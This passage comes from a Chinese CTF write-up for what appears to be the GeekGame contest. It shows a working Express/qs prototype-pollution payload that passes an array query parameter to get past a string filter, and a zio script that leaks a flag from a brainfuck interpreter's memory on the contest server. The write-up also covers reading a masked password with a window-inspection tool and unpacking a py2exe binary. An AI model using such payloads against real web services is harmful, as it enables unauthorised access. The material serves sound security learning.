    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Bad parameter!</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>如果环境配置恰当，<code class="language-plaintext highlighter-rouge">out_path</code> 的类型可以被推断为 <code class="language-plaintext highlighter-rouge">string | qs.ParsedQs | string[] | qs.ParsedQs[]</code>，是不是除了字符串，还有别的选择？比如说，如果是个数组呢？</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>node
Welcome to Node.js v17.0.1.
Type <span class="s2">".help"</span> <span class="k">for </span>more information.
<span class="o">&gt;</span> <span class="k">function </span>waf<span class="o">(</span>str<span class="o">)</span> <span class="o">{</span>
...     <span class="k">for</span><span class="o">(</span><span class="nb">let </span>bad_name of Object.getOwnPropertyNames<span class="o">(({})</span>.__proto__<span class="o">))</span>
...         <span class="k">if</span><span class="o">(</span>str.indexOf<span class="o">(</span>bad_name<span class="o">)!==</span><span class="nt">-1</span><span class="o">)</span>
...             <span class="k">return </span><span class="nb">true</span><span class="p">;</span>
...     <span class="k">return </span><span class="nb">false</span><span class="p">;</span>
... <span class="o">}</span>
undefined
<span class="o">&gt;</span> waf<span class="o">([</span><span class="s1">'constructor/prototype/activated'</span><span class="o">])</span>
<span class="nb">false</span>
<span class="o">&gt;</span> waf<span class="o">(</span><span class="s1">'constructor/prototype/activated'</span><span class="o">)</span>
<span class="nb">true</span>
</code></pre></div></div>

<p>看起来可以，并且数组不会影响后面的逻辑，因为 <code class="language-plaintext highlighter-rouge">out_path = prefix + out_path;</code>：</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="s1">''</span> + <span class="o">[</span><span class="s1">'constructor/prototype/activated'</span><span class="o">]</span>
<span class="s1">'constructor/prototype/activated'</span>
</code></pre></div></div>

<p>这就是 JavaScript 啊.png</p>

<p>最后看一下 express 是怎么解析 <code class="language-plaintext highlighter-rouge">req.query</code> 的：</p>

<p><a href="https://expressjs.com/en/api.html#req.query">https://expressjs.com/en/api.html#req.query</a></p>

<blockquote>
  <p>This property is an object containing a property for each query string parameter in the route. When query parser is set to disabled, it is an empty object <code class="language-plaintext highlighter-rouge">{}</code>, otherwise it is the result of the configured query parser.</p>
</blockquote>

<p>而 query parser:</p>

<blockquote>
  <p>The extended query parser is based on qs.</p>
</blockquote>

<p>默认配置是 “extended”。所以看一下 <code class="language-plaintext highlighter-rouge">qs</code> 包的文档：</p>

<blockquote>
  <p>Parsing Arrays</p>

  <p>You may specify an index as well:</p>
  <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">withIndexes</span> <span class="o">=</span> <span class="nx">qs</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="dl">'</span><span class="s1">a[1]=c&amp;a[0]=b</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">assert</span><span class="p">.</span><span class="nx">deepEqual</span><span class="p">(</span><span class="nx">withIndexes</span><span class="p">,</span> <span class="p">{</span> <span class="na">a</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">b</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">c</span><span class="dl">'</span><span class="p">]</span> <span class="p">});</span>
</code></pre></div>  </div>
</blockquote>

<p>好像可以，所以来整个 payload:</p>

<p><a href="http://localhost:8000/api/demo.json?in_path=1/age&amp;out_path[1]=constructor/prototype/activated">http://localhost:8000/api/demo.json?in_path=1/age&amp;out_path[1]=constructor/prototype/activated</a></p>

<p>然后访问激活页面，即可获取 flag1。</p>

<p>Node.js，新时代的 PHP（确信</p>

<h3 id="贰为所欲为未完成">贰·为所欲为（未完成）</h3>

<p>flag2 我的思路是 VM 逃逸，从 <code class="language-plaintext highlighter-rouge">/proc</code> 读取文件。但是我整不出足够短的 payload，jsfuck 生成的 payload 太长了，本地测试的时候就直接 <del>413</del> 431 了。</p>

<p>附注：这一小题 <span class="you-name">You</span> 酱赛后也和我聊了一下，最后发现这个思路是预期的，但是我犯的错误是：忘记在本地调试的时候开 <code class="language-plaintext highlighter-rouge">--max-http-header-size=32768</code> 参数，导致 payload 长的时候本地会出错。结果我后面的精力都在如何缩短 payload 上了（</p>

<blockquote>
  <p><span class="you-name">You</span> 酱：第一时间赶到现场嘲笑.jpg</p>
</blockquote>

<h2 id="诡异的网关">诡异的网关</h2>

<p>IDA 什么的统统不需要。跑一下程序就能大概猜出我们需要读取 flag 用户存储的密码，但是密码不允许直接复制。</p>

<p>有一个有趣的事情是，Windows 里的「窗口」的含义非常广泛，一个按钮也可以是一个窗口（<a href="https://docs.microsoft.com/en-us/windows/win32/learnwin32/what-is-a-window-">https://docs.microsoft.com/en-us/windows/win32/learnwin32/what-is-a-window-</a>）。而存在很多可以帮助开发者读取窗口内容的工具，比如说 Visual Studio 自带的 Spy++。我不想装这么大一个 VS，所以用的是 WinSpy++，把瞄准镜移到密码框即可。</p>

<p>感觉这题……和我出的那道密码生成器的不少选手的解法有点像，都是不去实际逆向逻辑，通过系统工具完成题目。</p>

<h2 id="最强大脑">最强大脑</h2>

<p><em>（仅做出第一题）</em></p>

<p>拖 IDA，就能发现初始化的时候会把 Flag 1 放在 brainfuck 内存区最后面。因为 payload 长度有限，没有办法一下子全部把 Flag 1 读出来。所以脚本如下：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">zio</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">token</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"your token"</span>

<span class="n">i</span> <span class="o">=</span> <span class="mi">10</span>
<span class="n">io</span> <span class="o">=</span> <span class="n">zio</span><span class="p">((</span><span class="s">"prob13.geekgame.pku.edu.cn"</span><span class="p">,</span> <span class="mi">10013</span><span class="p">))</span>
<span class="n">io</span><span class="p">.</span><span class="n">read_until</span><span class="p">(</span><span class="sa">b</span><span class="s">"token: "</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
<span class="n">io</span><span class="p">.</span><span class="n">read_until</span><span class="p">(</span><span class="sa">b</span><span class="s">"hex): "</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="n">writeline</span><span class="p">((</span><span class="sa">b</span><span class="s">"&gt;"</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4096</span> <span class="o">-</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)).</span><span class="nb">hex</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="sa">b</span><span class="s">".&gt;"</span> <span class="o">*</span> <span class="n">i</span><span class="p">).</span><span class="nb">hex</span><span class="p">())</span>
<span class="n">io</span><span class="p">.</span><span class="n">interact</span><span class="p">()</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"======="</span><span class="p">)</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">i</code> 从 10 开始可以读到 flag 左大括号部分，一步步把 <code class="language-plaintext highlighter-rouge">i</code> 减小，每次减一都能多读一个字符，最后可以获得完整的 flag。</p>

<p>这里用了 <a href="https://github.com/zTrix/zio">https://github.com/zTrix/zio</a>，因为我不想在 macOS 上装一大个的 pwntools。最近看的时候发现他们终于支持 Python 3 了，于是就不用我自己之前 patch 过 py3 支持的版本了。</p>

<p>第二题好像是 JIT？不太会 pwn，溜了（</p>

<h2 id="电子游戏概论">电子游戏概论</h2>

<p><em>（仅做出第一题）</em></p>

<p>题注：Python 现有的逆向工具链真的是大问题没有，小问题一大堆。</p>

<p>先直接用压缩软件解压 exe，看到 <code class="language-plaintext highlighter-rouge">pythoncom38.dll</code>，说明环境是 Python 3.8。</p>

<p>看到了 “提示：1. 程序采用 py2exe 打包，但网上的脚本可能需要少量修改”，那当然去找 py2exe 解包工具，找到了 <a href="https://github.com/matiasb/unpy2exe">https://github.com/matiasb/unpy2exe</a>，看到上次更新还是 <code class="language-plaintext highlighter-rouge">4 years ago</code>（不好的预感），没法直接用，会报 marshal 错误。又去翻 py2exe 代码：</p>

<p><a href="https://github.com/py2exe/py2exe/blob/master/py2exe/runtime.py#L331">https://github.com/py2exe/py2exe/blob/master/py2exe/runtime.py#L331</a></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">script_info</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"IIII"</span><span class="p">,</span>
                          <span class="mh">0x78563412</span><span class="p">,</span>
                          <span class="n">optimize</span> <span class="k">if</span> <span class="n">optimize</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="k">else</span> <span class="mi">0</span><span class="p">,</span>
                          <span class="n">unbuffered</span> <span class="k">if</span> <span class="n">unbuffered</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="k">else</span> <span class="mi">0</span><span class="p">,</span>
                          <span class="nb">len</span><span class="p">(</span><span class="n">script_data</span><span class="p">))</span>
<span class="n">script_info</span> <span class="o">+=</span> <span class="n">zippath</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span> <span class="o">+</span> <span class="n">script_data</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"</span><span class="se">\0</span><span class="s">"</span>
</code></pre></div></div>

<p>但是，unpy2exe 的处理 <a href="https://github.com/matiasb/unpy2exe/blob/master/unpy2exe.py#L86">https://github.com/matiasb/unpy2exe/blob/master/unpy2exe.py#L86</a>：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">_get_co_from_dump</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="s">"""Return the code objects from the dump."""</span>
    <span class="c1"># Read py2exe header
</span>    <span class="n">current</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">calcsize</span><span class="p">(</span><span class="sa">b</span><span class="s">'iiii'</span><span class="p">)</span>
    <span class="n">metadata</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="sa">b</span><span class="s">'iiii'</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="n">current</span><span class="p">])</span>

    <span class="c1"># check py2exe magic number
</span>    <span class="c1"># assert(metadata[0] == 0x78563412)
</span>    <span class="n">logging</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Magic value: %x"</span><span class="p">,</span> <span class="n">metadata</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="n">logging</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Code bytes length: %d"</span><span class="p">,</span> <span class="n">metadata</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>

    <span class="n">arcname</span> <span class="o">=</span> <span class="s">''</span>
    <span class="k">while</span> <span class="n">six</span><span class="p">.</span><span class="n">indexbytes</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">current</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">arcname</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">six</span><span class="p">.</span><span class="n">indexbytes</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">current</span><span class="p">))</span>
        <span class="n">current</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">logging</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Archive name: %s"</span><span class="p">,</span> <span class="n">arcname</span> <span class="ow">or</span> <span class="s">'-'</span><span class="p">)</span>

    <span class="n">code_bytes</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">current</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:]</span>
    <span class="c1"># verify code bytes count and metadata info
</span>    <span class="c1"># assert(len(code_bytes) == metadata[3])
</span>
    <span class="n">code_objects</span> <span class="o">=</span> <span class="n">marshal</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">code_bytes</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">code_objects</span>
</code></pre></div></div>

<p>最后的 <code class="language-plaintext highlighter-rouge">\0</code> 没有去掉，需要把 <code class="language-plaintext highlighter-rouge">code_bytes = data[current + 1:]</code> 改成 <code class="language-plaintext highlighter-rouge">code_bytes = data[current + 1:len(data) - 1]</code> 才能解包。</p>

<p>但是仅仅这么做是不够的，因为之后解析生成的 pyc 会出错。查 pyc 格式看到资料 <a href="https://hackmd.io/@C5qogZpXS6m0aedcVROJ6A/rkGBI_1ru?print-pdf#/">https://hackmd.io/@C5qogZpXS6m0aedcVROJ6A/rkGBI_1ru?print-pdf#/</a>，里面提到 Python 3.8 的 pyc header 是 16 bytes，但是 unpy2exe 漏了 4 个 bytes：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">_generate_pyc_header</span><span class="p">(</span><span class="n">python_version</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">python_version</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">version</span> <span class="o">=</span> <span class="n">__current_magic</span><span class="p">()</span>
        <span class="n">version_tuple</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">version_info</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">version</span> <span class="o">=</span> <span class="n">PYTHON_MAGIC_WORDS</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">python_version</span><span class="p">[:</span><span class="mi">3</span><span class="p">],</span> <span class="n">__current_magic</span><span class="p">())</span>
        <span class="n">version_tuple</span> <span class="o">=</span> <span class="nb">tuple</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">python_version</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)))</span>

    <span class="n">header</span> <span class="o">=</span> <span class="n">version</span> <span class="o">+</span> <span class="n">__timestamp</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">version_tuple</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">version_tuple</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">:</span>
        <span class="c1"># source code size was added to pyc header since Python 3.3
</span>        <span class="n">header</span> <span class="o">+=</span> <span class="n">__source_size</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">header</span>
</code></pre></div></div>

<p>加 4 个 bytes，我也不知道填啥，看别的 pyc header 最后 4 个 bytes 都是 0，所以我就把这 4 个 bytes 改成了 0x00。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">_generate_pyc_header</span><span class="p">(</span><span class="n">python_version</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">python_version</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">version</span> <span class="o">=</span> <span class="n">__current_magic</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[1] version:"</span><span class="p">,</span> <span class="n">version</span><span class="p">)</span>
        <span class="n">version_tuple</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">version_info</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">version</span> <span class="o">=</span> <span class="n">PYTHON_MAGIC_WORDS</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">python_version</span><span class="p">[:</span><span class="mi">3</span><span class="p">],</span> <span class="n">__current_magic</span><span class="p">())</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[2] version:"</span><span class="p">,</span> <span class="n">version</span><span class="p">)</span>
        <span class="n">version_tuple</span> <span class="o">=</span> <span class="nb">tuple</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">python_version</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'.'</span><span class="p">)))</span>

    <span class="n">header</span> <span class="o">=</span> <span class="n">version</span> <span class="o">+</span> <span class="n">__timestamp</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">version_tuple</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">version_tuple</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">:</span>
        <span class="c1"># source code size was added to pyc header since Python 3.3
</span>        <span class="n">header</span> <span class="o">+=</span> <span class="n">__source_size</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">version_tuple</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">3</span> <span class="ow">and</span> <span class="n">version_tuple</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="mi">8</span><span class="p">:</span>
        <span class="n">header</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># idk what it is, but size shall be 16bytes
</span>    <span class="k">print</span><span class="p">(</span><span class="s">"header size:"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">header</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">header</span>
</code></pre></div></div>

<p>之后就可以解包了。解包之后发现还差一个 <code class="language-plaintext highlighter-rouge">securesocket</code> 模块，去解压缩之后的文件夹里找就行。</p>

<p>然后用 <code class="language-plaintext highlighter-rouge">uncompyle6</code> 把 pyc 解析到源代码文件（<code class="language-plaintext highlighter-rouge">uncompyle6</code> 在面对缩进问题的时候不太靠谱，但是我的测试是 <code class="language-plaintext highlighter-rouge">decompile3</code> 更不靠谱）。调整一下几个明显的缩进问题，就能跑了。</p>

<p>顺便把 <code class="language-plaintext highlighter-rouge">get_platform_name()</code> 改了，不想每次跑都上报系统信息：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">get_platform_name</span><span class="p">():</span>
    <span class="n">u</span> <span class="o">=</span> <span class="n">platform</span><span class="p">.</span><span class="n">uname</span><span class="p">()</span>
    <span class="c1"># name = '%s (%s %s) on %s' % (u.node, u.system, u.version, u.processor)
</span>    <span class="n">name</span> <span class="o">=</span> <span class="s">'mcfx-fans (Arch Linux 20211117) on Apple M1 Pro Max'</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">name</span><span class="p">[:</span><span class="mi">500</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">name</span>
</code></pre></div></div>

<p>以及 token 改成硬编码，毕竟每次打开都要输一遍也不舒服（</p>

<p><strong>但是你会发现，游戏 CPU 占用率飙升，并且人物不会自动掉坑里，操作到后期极其不跟手，根本没法玩。</strong></p>

<p>让我们来修吧。经过很长很长时间的调试，最后发现了两个问题：</p>

<ol>
  <li>
    <p>为什么 CPU 占用率这么高？因为游戏在重绘 (<code class="language-plaintext highlighter-rouge">tick_routine()</code>) 上花掉了太长的时间：</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">def</span> <span class="nf">tick_routine</span><span class="p">(</span><span class="n">redraw</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
     <span class="k">global</span> <span class="n">dg</span>
     <span class="k">global</span> <span class="n">onscreen</span>

     <span class="k">def</span> <span class="nf">get_player_img</span><span class="p">():</span>
         <span class="k">return</span> <span class="n">player</span><span class="p">[((</span><span class="s">'Left'</span> <span class="k">if</span> <span class="n">game</span><span class="p">.</span><span class="n">player</span><span class="p">.</span><span class="n">left</span> <span class="k">else</span> <span class="s">'Right'</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="s">'Hurt'</span> <span class="k">if</span> <span class="n">game</span><span class="p">.</span><span class="n">player</span><span class="p">.</span><span class="n">life_restore</span> <span class="k">else</span> <span class="s">'Normal'</span><span class="p">))]</span>

     <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">GY</span><span class="p">):</span>
         <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">GX</span><span class="p">):</span>
             <span class="k">if</span> <span class="ow">not</span> <span class="n">redraw</span><span class="p">:</span>
                 <span class="k">if</span> <span class="n">game</span><span class="p">.</span><span class="n">g</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">onscreen</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="ow">or</span> <span class="n">game</span><span class="p">.</span><span class="n">g</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">==</span> <span class="n">Elem</span><span class="p">.</span><span class="n">player</span><span class="p">:</span>
                     <span class="n">onscreen</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">game</span><span class="p">.</span><span class="n">g</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span>
                     <span class="k">if</span> <span class="n">dg</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]:</span>
                         <span class="n">canvas</span><span class="p">.</span><span class="n">delete</span><span class="p">(</span><span class="n">dg</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">])</span>
                 <span class="k">if</span> <span class="n">game</span><span class="p">.</span><span class="n">g</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">==</span> <span class="n">Elem</span><span class="p">.</span><span class="n">player</span><span class="p">:</span>
                     <span class="n">dg</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">canvas</span><span class="p">.</span><span class="n">create_image</span><span class="p">((</span><span class="n">x</span> <span class="o">*</span> <span class="n">SZ</span><span class="p">),</span> <span class="p">(</span><span class="n">y</span> <span class="o">*</span> <span class="n">SZ</span><span class="p">),</span> <span class="n">anchor</span><span class="o">=</span><span class="s">'nw'</span><span class="p">,</span> <span class="n">image</span><span class="o">=</span><span class="p">(</span><span class="n">get_player_img</span><span class="p">()))</span>
                 <span class="k">else</span><span class="p">:</span>
                     <span class="n">dg</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">canvas</span><span class="p">.</span><span class="n">create_image</span><span class="p">((</span><span class="n">x</span> <span class="o">*</span> <span class="n">SZ</span><span class="p">),</span> <span class="p">(</span><span class="n">y</span> <span class="o">*</span> <span class="n">SZ</span><span class="p">),</span> <span class="n">anchor</span><span class="o">=</span><span class="s">'nw'</span><span class="p">,</span> <span class="n">image</span><span class="o">=</span><span class="p">(</span><span class="n">material</span><span class="p">[</span><span class="n">game</span><span class="p">.</span><span class="n">g</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]]))</span>
         <span class="k">else</span><span class="p">:</span>
             <span class="n">moneymsg</span><span class="p">.</span><span class="nb">set</span><span class="p">(</span><span class="s">'$%d/%d '</span> <span class="o">%</span> <span class="p">(</span><span class="n">game</span><span class="p">.</span><span class="n">cur</span><span class="p">,</span> <span class="n">game</span><span class="p">.</span><span class="n">goal</span><span class="p">))</span>
             <span class="n">moneybar</span><span class="p">[</span><span class="s">'value'</span><span class="p">]</span> <span class="o">=</span> <span class="n">game</span><span class="p">.</span><span class="n">cur</span>
             <span class="n">lifebar</span><span class="p">[</span><span class="s">'value'</span><span class="p">]</span> <span class="o">=</span> <span class="n">game</span><span class="p">.</span><span class="n">player</span><span class="p">.</span><span class="n">life</span>
             <span class="n">canvas</span><span class="p">.</span><span class="n">yview_moveto</span><span class="p">((</span><span class="n">BORDER</span> <span class="o">+</span> <span class="n">game</span><span class="p">.</span><span class="n">player</span><span class="p">.</span><span class="n">y</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">/</span> <span class="p">(</span><span class="n">GY</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">BORDER</span><span class="p">))</span>
             <span class="n">canvas</span><span class="p">.</span><span class="n">xview_moveto</span><span class="p">((</span><span class="n">BORDER</span> <span class="o">+</span> <span class="n">game</span><span class="p">.</span><span class="n">player</span><span class="p">.</span><span class="n">x</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">/</span> <span class="p">(</span><span class="n">GX</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">BORDER</span><span class="p">))</span>
</code></pre></div>    </div>

    <p>每个坐标都要 <code class="language-plaintext highlighter-rouge">canvas.create_image()</code> 是耗时的，把它们加个缩进：</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">for</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">GY</span><span class="p">):</span>
     <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">GX</span><span class="p">):</span>
         <span class="k">if</span> <span class="ow">not</span> <span class="n">redraw</span><span class="p">:</span>
             <span class="k">if</span> <span class="n">game</span><span class="p">.</span><span class="n">g</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">onscreen</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="ow">or</span> <span class="n">game</span><span class="p">.</span><span class="n">g</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">==</span> <span class="n">Elem</span><span class="p">.</span><span class="n">player</span><span class="p">:</span>
                 <span class="n">onscreen</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">game</span><span class="p">.</span><span class="n">g</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span>
                 <span class="k">if</span> <span class="n">dg</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]:</span>
                     <span class="n">canvas</span><span class="p">.</span><span class="n">delete</span><span class="p">(</span><span class="n">dg</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">])</span>
                 <span class="k">if</span> <span class="n">game</span><span class="p">.</span><span class="n">g</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">==</span> <span class="n">Elem</span><span class="p">.</span><span class="n">player</span><span class="p">:</span>
                     <span class="n">dg</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">canvas</span><span class="p">.</span><span class="n">create_image</span><span class="p">((</span><span class="n">x</span> <span class="o">*</span> <span class="n">SZ</span><span class="p">),</span> <span class="p">(</span><span class="n">y</span> <span class="o">*</span> <span class="n">SZ</span><span class="p">),</span> <span class="n">anchor</span><span class="o">=</span><span class="s">'nw'</span><span class="p">,</span> <span class="n">image</span><span class="o">=</span><span class="p">(</span><span class="n">get_player_img</span><span class="p">()))</span>
                 <span class="k">else</span><span class="p">:</span>
                     <span class="n">dg</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">canvas</span><span class="p">.</span><span class="n">create_image</span><span class="p">((</span><span class="n">x</span> <span class="o">*</span> <span class="n">SZ</span><span class="p">),</span> <span class="p">(</span><span class="n">y</span> <span class="o">*</span> <span class="n">SZ</span><span class="p">),</span> <span class="n">anchor</span><span class="o">=</span><span class="s">'nw'</span><span class="p">,</span> <span class="n">image</span><span class="o">=</span><span class="p">(</span><span class="n">material</span><span class="p">[</span><span class="n">game</span><span class="p">.</span><span class="n">g</span><span class="p">[</span><span class="n">y</span><span class="p">][</span><span class="n">x</span><span class="p">]]))</span>
</code></pre></div>    </div>

    <p>就能解决 CPU 占用的问题了。</p>
  </li>
  <li>
    <p>为什么人物不会自己掉坑里，必须要再加一个操作才会响应？因为判断是否 <code class="language-plaintext highlighter-rouge">game.tick()</code> 的部分出了问题。</p>

    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">try</span><span class="p">:</span>
     <span class="k">if</span> <span class="n">game</span><span class="p">.</span><span class="n">player</span><span class="p">.</span><span class="n">command</span> <span class="o">==</span> <span class="n">Command</span><span class="p">.</span><span class="n">empty</span><span class="p">:</span>
         <span class="n">x</span> <span class="o">=</span> <span class="n">cmds</span><span class="p">.</span><span class="n">get_nowait</span><span class="p">()</span>
         <span class="n">game</span><span class="p">.</span><span class="n">player</span><span class="p">.</span><span class="n">command</span> <span class="o">=</span> <span class="n">x</span>
